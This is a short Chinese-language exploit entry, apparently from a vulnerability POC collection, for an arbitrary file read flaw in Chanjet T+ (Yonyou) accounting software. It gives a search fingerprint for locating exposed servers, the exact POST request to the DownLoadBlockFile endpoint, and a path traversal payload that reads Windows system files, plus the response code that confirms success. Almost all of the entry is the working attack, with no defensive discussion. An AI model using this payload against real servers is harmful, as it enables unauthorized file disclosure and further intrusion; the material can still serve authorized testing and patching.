# 畅捷通T+DownLoadBlockFile存在任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`POST /tplus/GLSyncService.asmx/DownLoadBlockFile HTTP/1.1`

**Payload**
```
fileName=..%2F..%2F..%2FWindows%2Fwin.ini
```
- **响应特征**：200